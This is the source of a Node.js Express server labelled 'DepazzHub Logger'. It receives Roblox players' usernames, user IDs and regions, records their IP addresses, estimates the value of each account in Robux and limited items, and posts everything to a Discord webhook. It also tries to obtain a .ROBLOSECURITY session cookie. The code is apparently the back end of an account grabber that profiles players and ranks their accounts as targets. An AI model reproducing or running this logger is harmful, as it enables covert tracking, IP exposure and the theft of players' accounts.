const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(express.json());
app.use(cors());
app.set('trust proxy', true);

const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;

// Función para obtener la cookie .ROBLOSECURITY
async function getRoblosecurityCookie() {
  try {
    const response = await axios.get('https://www.roblox.com/user.aspx', {
      withCredentials: true,
      maxRedirects: 5
    });
    
    const cookieHeader = response.headers['set-cookie'];
    if (cookieHeader) {
      const roblosecurityCookie = cookieHeader.find(c => c.includes('.ROBLOSECURITY='));
      if (roblosecurityCookie) {
        return roblosecurityCookie.split(';')[0].split('=')[1];
      }
    }
    
    return null;
  } catch (error) {
    console.error('Error al obtener la cookie .ROBLOSECURITY:', error.message);
    return null;
  }
}

// Función para hacer peticiones autenticadas a Roblox
async function getAccountValue(userId) {
  try {
    // Primero obtenemos la cookie
    const cookie = await getRoblosecurityCookie();
    
    // Si no tenemos cookie, intentamos sin autenticación
    if (!cookie) {
      console.log('No se pudo obtener la cookie, intentando sin autenticación');
      // Tu código existente para peticiones sin autenticación
      const robuxRes = await axios.get(`https://economy.roblox.com/v2/users/${userId}/currency`);
      const robux = robuxRes.data.robux || 0;

      let rap = 0;
      try {
        const rapRes = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/inventory/collectibles?limit=100&sortOrder=Desc`);
        if (rapRes.data && rapRes.data.data) {
          rap = rapRes.data.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
        }
      } catch (e) {
        console.log("Inventario privado o error al obtener RAP.");
      }

      const total = robux + rap;

      return {
        robux: robux.toLocaleString('en-US'),
        rap: rap.toLocaleString('en-US'),
        total: total.toLocaleString('en-US')
      };
    }
    
    // Si tenemos cookie, hacemos peticiones autenticadas
    const robuxRes = await axios.get(`https://economy.roblox.com/v2/users/${userId}/currency`, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`
      }
    });
    
    const robux = robuxRes.data.robux || 0;

    let rap = 0;
    try {
      const rapRes = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/inventory/collectibles?limit=100&sortOrder=Desc`, {
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`
        }
      });
      
      if (rapRes.data && rapRes.data.data) {
        rap = rapRes.data.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
      }
    } catch (e) {
      console.log("Inventario privado o error al obtener RAP.");
    }

    const total = robux + rap;

    return {
      robux: robux.toLocaleString('en-US'),
      rap: rap.toLocaleString('en-US'),
      total: total.toLocaleString('en-US')
    };
  } catch (error) {
    console.error("Error al calcular valor:", error.message);
    return { robux: "N/A", rap: "N/A", total: "N/A" };
  }
}

// Tu endpoint POST actual
app.post('/log', async (req, res) => {
  try {
    const { username, displayName, userId, gameId, accountAge, region } = req.body;
    
    const clientIP = req.ip || req.connection.remoteAddress || 'N/A';

    const accountValue = await getAccountValue(userId);

    const payload = {
      content: "🚀 **DepazzHub**",
      embeds: [{
        color: 3887359,
        fields: [
          { name: "👤 Username", value: username || "Unknown", inline: true },
          { name: "🏷️ Display Name", value: displayName || "N/A", inline: true },
          { name: "🌐 IP Address", value: `\`${clientIP}\``, inline: true },
          
          // 💰 NUEVOS CAMPOS DE VALOR
          { name: "💵 Robux", value: `R$ ${accountValue.robux}`, inline: true },
          { name: "💎 RAP (Limiteds)", value: `R$ ${accountValue.rap}`, inline: true },
          { name: "💰 Total Value", value: `**R$ ${accountValue.total}**`, inline: true },
          
          { name: "🎂 Account Age", value: accountAge || "N/A", inline: true },
          { name: "🌍 Region", value: region ? region.toUpperCase() : "N/A", inline: true },
          { name: "🆔 User ID", value: String(userId || "N/A"), inline: true },
          { name: "🌐 Game ID", value: String(gameId || "N/A"), inline: false }
        ],
        footer: { text: "DepazzHub Logger" },
        timestamp: new Date().toISOString()
      }]
    };

    await axios.post(DISCORD_WEBHOOK, payload);
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error:", error.message);
    res.status(500).json({ error: error.message });
  }
});

app.get('/', (req, res) => {
  res.json({ 
    status: "✅ API is running!",
    webhookConfigured: !!DISCORD_WEBHOOK
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
